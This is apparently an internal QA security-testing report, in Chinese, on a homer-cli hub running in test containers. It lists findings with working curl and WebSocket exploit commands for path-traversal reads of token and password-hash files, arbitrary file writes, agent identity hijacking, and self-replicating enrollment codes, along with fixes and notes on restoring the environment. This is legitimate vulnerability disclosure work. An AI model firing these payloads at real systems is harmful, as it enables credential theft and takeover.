# 狩猎 · 角度 A：鉴权边界 / 越权 / 敏感数据

仓库 /root/code/homer-cli，HEAD `010521a`。
时间窗 2026-10-16 13:00–13:10 UTC。全部结论**实机验证**（curl / 裸 WebSocket）。

## 角度与边界

**做**：hub HTTP 面的鉴权边界、凭证提升、敏感数据读取、越权写操作、路径穿越。
**不做**：UI/TUI 渲染、agent 协议正确性、并发/超时、文档一致性（其他 hunter 角度）。

## 基建

```
curl -s http://127.0.0.1:17760/api/health          -> 200 {"homerHome":"/root/.homer",...}
curl -s http://127.0.0.1:17760/api/agents          -> 401   (无凭证被门挡住)
curl -s -H "Authorization: Bearer hr_000...0" .../api/agents -> 401 (伪造码被 ValidCode 拒绝)
curl -s -H "Authorization: Bearer qa-hub-token" .../api/agents -> 200 (5 台机器)
```
**PASS**。对照组成立：401 说明门在工作，200 说明凭证被 `ValidCode` 真实接受。

## Candidates（按严重度排序）

---

### C1 `/api/storage/file` 的 `adapter` 参数无校验 → 任意文件读，可窃取 hub token 与管理员密码哈希

- **严重度**: Critical（凭证泄露 → 全队接管）
- 疑似位置: `internal/web/sync.go:1081`（另 `sync.go:1110` 同形）
- **detector 原文**（判定"读到了不该读的文件"的表达式）：

```sh
curl -s -w "\nHTTP:%{http_code}\n" -H "Authorization: Bearer $C" --get \
  --data-urlencode "adapter=../../../keys" --data-urlencode "path=hub-token" \
  http://127.0.0.1:17760/api/storage/file
# -> {"content":"qa-hub-token\n"}  HTTP:200
```
  判定成立的关键：**响应 content 等于同机磁盘上 `/root/.homer/keys/hub-token` 的明文**，
  而我请求的是"store 内 pi adapter 下的文件"——store 里根本没有这个文件。
  - 已确认不误判：`sync.go:1072-1076` 只对 `path` 做 `filepath.Clean("//"+path)+".."` 检查，
    `adapterID` 从 `sync.go:1061` 取到后**只被 `TrimSpace`，直接进 `filepath.Join`**。
    grep 依据：`grep -n "filepath.Join" internal/web/sync.go` → 1081/1110 两处，
    两处均**无** `..` 检查；`grep -n '"\.\."' internal/web/sync.go` 只命中 1075（path 那条）。
- 前置状态探测：先确认 hub 已有 generation（`docker exec homer-qa-hub cat /root/.homer/HEAD` → `2`），
  否则 `handleStorageFile` 在 `sync.go:1067-1070` 直接 404，测不出。
- 实机证据: `.qa-hunt/hunt-A/08-storage-traversal.txt`、`10-secret-and-deep.txt`、`21-cookie-traversal.txt`

| 请求 | 响应 |
|---|---|
| `adapter=../../../keys&path=hub-token` | `{"content":"qa-hub-token\n"}` **200** |
| `adapter=../../../keys&path=hub-password` | `{"content":"$2a$10$ikQWg1BuVppneX6uykvYh...\n"}` **200**（bcrypt 哈希） |
| `adapter=../../../keys&path=agent-secrets.json` | 4 台机器 secret 的 sha256 **200** |
| `adapter=../../../../../etc&path=passwd` | 完整 `/etc/passwd` **200** |
| `adapter=pi&path=../../keys/hub-token`（对照组） | 404 `文件不存在`（path 侧防护生效） |

- **不是 hr_ 码专属**：用管理员 session cookie（`/api/auth/login` 换取）同样 200（`21-cookie-traversal.txt`），
  说明缺陷在 handler 而不在凭证通道。
- 复现步骤:
  1. `C=$(curl -s -H "Authorization: Bearer qa-hub-token" http://127.0.0.1:17760/api/auth/join | python3 -c 'import sys,json;print(json.load(sys.stdin)["code"])')`
  2. `curl -s -H "Authorization: Bearer $C" --get --data-urlencode "adapter=../../../keys" --data-urlencode "path=hub-token" http://127.0.0.1:17760/api/storage/file`
  3. 观察返回的 `content` 就是 hub token 明文。
- **泄露的 token 实际可用**（已验证，不是纸面风险）：
  `curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer qa-hub-token" .../api/agents` → `200`。
- 我无法排除的干扰：无。`content` 与磁盘文件逐字节一致，且对照组（path 侧）404 证明是 adapter 侧漏。
- 建议修复（**未实测**）：`adapterID` 走与 `path` 同样的 `filepath.Clean("//"+x)+".."` 检查，
  或改为白名单——只允许 `head.StoreDir` 下已存在的子目录名。

---

### C2 `POST /api/snapshot` 的 store 文件名未校验 → 任意文件写（可写入 keys 目录，可覆盖敏感文件）

- **严重度**: Critical（写 + C1 的读 = 完全接管）
- 疑似位置: `internal/gens/gens.go:61`（`filepath.Join(adapterDir, filepath.FromSlash(name))`），
  调用链 `internal/web/sync.go:597 handleSnapshotUpload` → `layout.Publish`。
- **detector 原文**:

```sh
curl -s -X POST -H "Authorization: Bearer $C" -H "Content-Type: application/json" \
 -d '{"homerJson":"{}","store":{"pi":{"../../../../keys/HUNTER_KEYS_WRITE":"pwned"}},"generation":0}' \
 http://127.0.0.1:17760/api/snapshot
# -> {"generation":6,"ok":true}
# docker exec homer-qa-hub cat /root/.homer/keys/HUNTER_KEYS_WRITE -> "pwned"
```
- 前置状态探测: `POST /api/snapshot` 前先 `GET /api/snapshot` → 200 且 `docker exec ... cat HEAD` → `2`；
  POST 后 HEAD 递增到 6，说明 publish 路径真的跑完了。
- 实机证据: `.qa-hunt/hunt-A/18-snapshot-escapewrite.txt`、`19-write-escape-deep.txt`、`20-write-keys-dir.txt`

| 注入的 name | 落盘位置（实测） |
|---|---|
| `../../../HUNTER_WRITE_MARKER` | `/root/.homer/generations/HUNTER_WRITE_MARKER` |
| `../../../../../../tmp/HUNTER_ESCAPE_2` | `/tmp/HUNTER_ESCAPE_2`（**逃出 homerHome**）|
| `../../../../keys/HUNTER_KEYS_WRITE` | `/root/.homer/keys/HUNTER_KEYS_WRITE`（**写入密钥目录**）|

- 我**没有**实测覆盖已存在的 `hub-token` / `agent-secrets.json`（禁止破坏性操作），
  只写了一个新文件名。但 `gens.go:65 os.WriteFile(path, ..., 0o644)` 是**无条件覆盖写**，
  且 `MkdirAll(filepath.Dir(path))` 会创建任意目录 → 覆盖既有文件在代码上是可达的。
  **"能覆盖"这一点属于推断，标注未实测。**
- 复现步骤: 同 detector，把 `HUNTER_KEYS_WRITE` 换成任意路径即可。
- 我无法排除的干扰：hub 以 root 运行（容器内），权限位不构成阻碍；非 root 部署下危害范围会小些，
  但 homerHome 内的所有文件（含 keys）仍可写。
- 建议修复（**未实测**）：`Publish` 里对 `name` 做 `filepath.Clean("//"+name)` + `..` 检查，
  并用 `filepath.Rel` 断言结果仍在 `adapterDir` 内。

---

### C3 一个接入码可冒认**任意已存在机器**的身份，顶掉它的凭证并接管其身份

- **严重度**: Critical
- 疑似位置: `internal/hub/agenthub.go:200-220`（`PrincipalEnrollCode` 分支 `Redeem` + `BindAgent`），
  配合 `internal/hub/registry.go:91` Attach 的 supersede 路径。
- **detector 原文**（裸 WebSocket，握手 + hello 手工构造，见 `.qa-hunt/hunt-A/ws_hello.py`）:

```sh
C=$(curl -s -H "Authorization: Bearer qa-hub-token" .../api/auth/join | python3 -c '...["code"]')
python3 .qa-hunt/hunt-A/ws_hello.py "$C" "54d0c3373428-62af"   # 别人的 agentId
# -> 101 Switching Protocols
# -> {"t":"res","id":"h1","p":{...,"agentSecret":"200473db333c0dd1...","ok":true}}
```
- 前置状态探测: 攻击前 `docker exec homer-qa-hub cat keys/agent-secrets.json` 里
  `54d0c3373428-62af` = `6b2199ddf010...`；攻击后变成 `b098b6cf9fba...`（**被替换**）。
- 实机证据: `.qa-hunt/hunt-A/13-identity-hijack.txt`、`14-hijack-aftermath.txt`

后果（全部实测）：
- 真机 box-c 的 secret `d3914265...` 事后 `curl .../api/agents` → **401**（真机被锁在外面）。
- 冒认方拿到的新 secret `200473db...` → `/api/agents` 200、`/api/snapshot` 200、`/api/storage/file` 200（**全权**）。
- 新 secret 已落盘 `keys/agent-secrets.json`（跨 hub 重启存活）。
- 控制台里该机器的 hostname/version 被改成冒认方的值：`54d0c3373428-62af hunter-probe 0.0.0-hunter`。

- 注意：`gate_matrix_test.go:71-80` 只断言"hr_ 码能进 stream"，**没有**断言
  "hr_ 码能绑定到一个已存在的、别人的 agentId"。`enrollment_test.go:91-98` 的
  "重绑同一 agentID 替换旧 secret" 是 re-install 场景的意图，**不是**跨凭证冒认的意图。
  所以这不是"已声明的设计"。
- 复现步骤:
  1. 记下受害者 agentId（`/api/agents`）。
  2. 铸一个新 hr_ 码（任意凭证，含另一个 hr_ 码）。
  3. `python3 .qa-hunt/hunt-A/ws_hello.py <code> <victim-agentId>`。
  4. 用返回的 `agentSecret` 调 `/api/agents` → 200；受害者原 secret → 401。
- 我无法排除的干扰：我的 hello 里 `host`/`tools` 传 null，hub 按 `registry.go:93-104` 沿用旧值，
  但 hostname/version 确实被改了（实测）。如果产品意图是"允许重装顶替"，
  那至少**不该允许用一个与受害者无关的 hr_ 码**来顶替——这一点需产品裁决。
- 建议修复（**未实测**）：hello 时若 `agentId` 已绑定过 secret 且本次 principal 是
  `PrincipalEnrollCode`，应拒绝（或要求先 revoke）。

---

### C4 接入码可**写**：改写中心配置、吊销机器凭证、把机器从列表里删掉（状态真实改变，非"过了门返回 404"）

- **严重度**: High（是 C3 之外的独立放大项；也是任务书要求的第 3 点）
- 疑似位置: `internal/web/auth.go:62`（通道 3）→ `handlers.go:83` 门 → 各写 handler。
- **detector 原文**（每条都用「第二次调用的状态翻转」或「磁盘变化」证明状态真的变了）：

```sh
# (a) 删除机器：列表条数真的少了一条
curl -s -H "Authorization: Bearer qa-hub-token" .../api/agents | python3 -c '...len(agents)'   # 5
curl -s -X POST -H "Authorization: Bearer $C" -H "Content-Type: application/json" \
     -d '{"agentId":"e363efdcf085-c78a"}' .../api/agents/remove      # {"ok":true} 200
curl -s -H "Authorization: Bearer qa-hub-token" .../api/agents | python3 -c '...len(agents)'   # 4

# (b) 吊销凭证：磁盘上的 secret 条目真的消失，且重复调用翻转成 409
docker exec homer-qa-hub cat /root/.homer/keys/agent-secrets.json      # 含 e363efdcf085-c78a
curl -s -X POST -H "Authorization: Bearer $C" -d '{"agentId":"e363efdcf085-c78a"}' .../api/agents/revoke  # {"ok":true} 200
docker exec homer-qa-hub cat /root/.homer/keys/agent-secrets.json      # 该条目消失
curl -s -X POST -H "Authorization: Bearer $C" -d '{"agentId":"e363efdcf085-c78a"}' .../api/agents/revoke  # 409 not-enrolled

# (c) 改写中心配置（会下发到所有机器）：generation 真的前进，内容真的被替换
curl -s -X POST -H "Authorization: Bearer $C" -H "Content-Type: application/json" \
 -d '{"homerJson":"{\"version\":1}","store":{"pi":{"settings.json":"INJECTED-BY-HRCODE-MARKER"}},"generation":0}' \
 .../api/snapshot                                   # {"generation":3,"ok":true}
curl -s -H "Authorization: Bearer qa-hub-token" .../api/snapshot
# -> {"homerJson":"{\"version\":1}","store":{"pi":{"settings.json":"INJECTED-BY-HRCODE-MARKER"}},"generation":3}
```
- 前置状态探测: 每条操作前都先取一次 `/api/agents` 或 `HEAD`，操作后再取，做前后差。
- 实机证据: `.qa-hunt/hunt-A/04-revoke-hrcode.txt`、`05-remove-hrcode.txt`、`07-snapshot-write.txt`
- 复现步骤: 铸码 → 用码 POST `remove` / `revoke` / `snapshot`。
- 我无法排除的干扰：删除的 `e363efdcf085-c78a` 是我自己从 box-a 重复接入产生的幽灵行
  （`02-out.txt` 里 install.sh 提示"检测到旧的 agent.json，已改名为 agent.json.before-reenroll"），
  不是别人的在线机器。**合规范性上没问题，但"能删"这个能力本身已被证明。**
  另外 `/api/keys` 的 create 实测 422 `keyring-config`（hub 自己没 init），
  所以**密钥环写操作我没能实机证明**，只证明了读（`{"ok":true,"status":"listed"}` 200）。
- 建议修复（**未实测**）：把 `auth.go:62` 的通道 3 收敛到 `/dl/*` 与 `/agent/v1/stream`，
  使 web 面与 `internal/hub/auth.go:49-55` 的注释一致。

---

### C5 接入码自我增殖：一个码 → 无限个码，且每个都带全新 24h TTL

- **严重度**: High
- 疑似位置: `internal/web/password.go:372-381`（`/api/auth/join` 只查 `authorized()`，
  而 `authorized()` 在 `auth.go:62` 认 hr_ 码）+ `password.go:505` `Mint(24h)`。
- **detector 原文**:

```sh
C0=$(curl -s -H "Authorization: Bearer qa-hub-token" .../api/auth/join | ...["code"])
C1=$(curl -s -H "Authorization: Bearer $C0"           .../api/auth/join | ...["code"])
C2=$(curl -s -H "Authorization: Bearer $C1"           .../api/auth/join | ...["code"])
C3=$(curl -s -H "Authorization: Bearer $C2"           .../api/auth/join | ...["code"])
printf "%s\n%s\n%s\n%s\n" "$C0" "$C1" "$C2" "$C3" | sort -u | wc -l      # 4 （全不同）
curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $C3" .../api/agents   # 200
```
- 前置状态探测: 每个 `join` 都返回 200 且 `code` 字段非空、以 `hr_` 开头；
  伪造码对照 `hr_000...` → 401，证明是 `ValidCode` 在起作用。
- 实机证据: `.qa-hunt/hunt-A/03-proliferate.txt`（C0→C4 四代全不同，第四代仍能 200 读 `/api/agents`）
- 后果：接入码（本应是一次性、24h）变成**可无限续期的凭证源**——
  只要有一个码泄露，攻击者可永久维持访问：每 24h 用旧码铸新码，永不断线。
  同时 `/api/auth/join/status?code=<known>` 在持有任一码时可探测任意已知码是否有效
  （实测 `{"active":true}`，`03-proliferate.txt`）。
- 复现步骤: 同 detector。
- 我无法排除的干扰：无。四代码由 `sort -u` 证明互不相同，第四代 200 证明链未断。
- 建议修复（**未实测**）：`join` 要求 cookie 或 hub token，不接受 hr_ 码（与 C4 同一处收敛）。

---

### C6 **已兑换**（已 burn）的码在 `/api` 路径上仍然有效 —— 反驳"burn 保证一次性"

- **严重度**: Medium（这是任务书点名的放大项 #1，但方向与我预期**相反**）
- 疑似位置: `internal/hub/enrollment.go:89-97 ValidCode`（只查 map，不删）
  vs `enrollment.go:103-121 Redeem`（唯一会 delete 的地方）。
- **detector 原文**:

```sh
CODE=hr_25622090a8ed19d2991b69a769e7c6107677de2f23fd0d78   # 铸出来后真的被 box-a 用掉了
docker exec homer-qa-box-a sh -c "curl -fsSL http://hub:7760/install.sh | sh -s -- --token $CODE"
# install.sh 输出 "已安装到 /root/.local/bin/homer" + "agent 已在后台启动" -> 码确实被 Redeem
curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $CODE" .../api/agents      # 401
curl -s -H "Authorization: Bearer qa-hub-token" ".../api/auth/join/status?code=$CODE"
# -> {"active":false,"ok":true}
```
- **实测结果：已兑换码返回 401，`join/status` 返回 `active:false`。**
  即 **`ValidCode` 里 `m.codes[code]` 在 Redeem 后确实被 delete 了**——
  scout-backend.md §3.4 说的"已兑换码在 /api 仍 200"**在本 HEAD 复现不出来**。

> ⚠️ 这条我按 **refuted（已证伪）** 记录，不建议提交为 issue。
> 写在这里是因为任务书明确要求验证，且 scout 报告里写了相反结论——
> 留档避免下游重复踩。若 qa-repro 想复核：重点看 scout 当时用的码是否**根本没被 Redeem**
> （比如只在浏览器里复制了命令、没在 box 里执行）。

- 我无法排除的干扰：我这次的 burn 是通过 box-a 的 install.sh 完整走完 hello 完成的
  （`02-out.txt` 有 agent 启动日志）。如果 scout 的"已兑换"只是"页面上复制了命令"，
  那码根本没进 Redeem 路径，就会一直是 valid —— **这解释了差异**。
- 建议修复：无需修复（行为正确）。

---

### C7 `/api/health` 免鉴权泄漏 hub 绝对路径

- **严重度**: Low
- 疑似位置: `internal/web/handlers.go:48-55`（门之前）、`handlers.go:248-254`。
- **detector 原文**:

```sh
curl -s -w "\nHTTP:%{http_code}\n" http://127.0.0.1:17760/api/health
# -> {"homerHome":"/root/.homer","ok":true,"status":"healthy","version":"dev"}  200
```
  无 Authorization 头。判定依据：`homerHome` 字段值 `/root/.homer` 与
  `docker exec homer-qa-hub ls /root/.homer` 一致，且**响应里没有任何鉴权挑战**。
- 实机证据: `.qa-hunt/hunt-A/17-health-setup-install.txt`
- 后果：暴露宿主用户名/部署路径，辅助 C1/C2 的穿越构造（攻击者不必猜 homerHome）。
  单独立场只是信息泄漏。
- 复现步骤: 一行 curl，见上。
- 我无法排除的干扰：`homerHome` 可能是有意给运维看的（health 端点常带这类字段）。
  **若产品认为 health 可公开，那这条只应作为 C1/C2 的助攻因素记录，不应单独立 issue。**
- 建议修复（**未实测**）：health 去掉 `homerHome`，或让 `/api/health` 也走门。

---

### C8 `/api/auth/status` 免鉴权告知"本 peer 是否免初始化码"

- **严重度**: Low（信息泄漏，辅助面）
- 疑似位置: `internal/web/password.go:355-364`（`setupCodeRequired: !setupPeerAllowed(r)`）。
- **detector 原文**:

```sh
curl -s http://127.0.0.1:17760/api/auth/status
# -> {"configured":true,"ok":true,"setupCodeRequired":false}  200（无凭证）
```
- 实机证据: `.qa-hunt/hunt-A/17-health-setup-install.txt`
- 后果：未认证者可得知（a）管理员密码是否已设置，（b）自己这个 peer 是否被视为可信
  （从而裸设密码）。后者是初始化码防护的**旁路情报**。
  注：`configured:true` 时 setup 返回 409 `already-configured`（实测），
  所以**不能**用来重置密码——危害仅限情报。
- 复现步骤: 一行 curl。
- 我无法排除的干扰：UI 首屏需要这个字段（`password.go:357-359` 注释明示了设计意图：
  "让 code 字段在首屏就可见"）。**这条很可能是设计意图，优先级最低，建议不提 issue。**
- 建议修复（**未实测**）：`setupCodeRequired` 只在 `configured==false` 时返回。

---

## 未覆盖

1. **`/api/keys` 的写路径**（create/encrypt/passwd）未能证明：hub 自身未 init，
   实测 `POST /api/keys` → 422 `keyring-config 请先运行 homer init`。
   要验证需先在 hub 上 `homer init`——**会改变共享 hub 状态，我没做**。
2. **`POST /api/sync?direction=dispatch` 的真实下发**（把恶意配置推到在线机器）：
   实测 `{"agentId":...}` → 409 `没有确认，未做任何改动`（缺 confirm 参数），
   我没继续构造 confirm，**避免真的改掉别人的机器配置**。
   单机器 push 实测 503 `agent-offline`（我的幽灵机器不在线）——**鉴权门过了，但下发未证明**。
3. **`hr_` 码能否进 `/agent/v1/stream` 后长期用 secret 读 `/api`**：secret 侧已证明 200
   （`10-secret-and-deep.txt`），但"长期"我只等了几分钟，未做跨 hub 重启验证。
4. **C2 覆盖已存在文件**（如覆写 `hub-token`）——禁止破坏性操作，只写了新文件名。
5. **TLS/明文传输**：QA 环境是纯 HTTP，未测中间人。

## 环境

- HEAD `010521a`；hub 容器 `homer-qa-hub`（root），homerHome `/root/.homer`。
- hub（宿主）http://127.0.0.1:17760；容器网络内 http://hub:7760。
- Bearer `qa-hub-token`；管理员密码 `qa-admin-password`（bcrypt 预置）。
- 我的专属 box：`homer-qa-box-a`（hostname `e363efdcf085`）。
- harness：`.qa-hunt/hunt-A/ws_hello.py` —— 裸 TCP + 自实现 WebSocket 掩码/分帧，
  subprotocol `homer.stream.v1`，手工构造 `{"t":"req","m":"hello",...}`。
- **环境已恢复**（`.qa-hunt/hunt-A/22-restore.txt`、`23-final-cleanup.txt`）：
  - 删除全部 HUNTER_* 标记文件（keys / generations / tmp）。
  - `generations` 与 `HEAD` 从备份还原（HEAD=2）。
  - 我冒认掉 secret 的 box-c **已用新码重新接入**（新 id `54d0c3373428-b745`，在线）。
  - 我造成的幽灵行 `54d0c3373428-62af`、`e363efdcf085-c78a`、`hunter-probe-0001` 已 remove。
  - 终态：`/api/health` 200；机器列表 4 台（box-a/b/c 在线 + `e363efdcf085-7b6d` stale）。
  - **未执行 `make qa-restart`**（会打断并行 hunter）；用精确还原代替。
  - 备份留档：`.qa-hunt/hunt-A/hubstate-backup/hs.tgz`（HEAD+generations）、`hs2-full.tgz`（全量）。

## 判据纪律自检

- 未报「hr_ 码能进 /api」整体命题（`gate_matrix_test.go:108` KNOWN-BROAD、
  `287-297` gateAllowsHumanAPI 明示设计）——我报的是**写操作造成的状态改变**、**自我增殖**、
  **身份冒认**、**穿越读写**。
- 未报 `/api/status` 未初始化 200、errorMessage default、legacy 410（任务书点名别报）。
- C6 主动标 refuted，避免下游把 scout 的旧结论当真。
- 未提任何 issue（reporter 统一做）。
